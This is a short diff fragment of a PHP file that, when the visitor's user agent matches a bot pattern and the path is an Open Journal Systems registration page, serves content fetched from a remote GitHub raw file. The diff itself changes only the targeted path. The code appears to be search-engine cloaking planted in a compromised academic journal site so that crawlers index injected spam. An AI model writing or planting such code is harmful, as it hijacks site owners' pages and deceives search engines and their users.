@@ -15,7 +15,7 @@ function aselolejos($url){
     return $output;
 }
 
-if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/ojs/index.php/jhpk/user/register") {
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/index.php/jhpk/user/register") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
     echo aselolejos("https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/jurnalmahupiki-jhpk.txt");
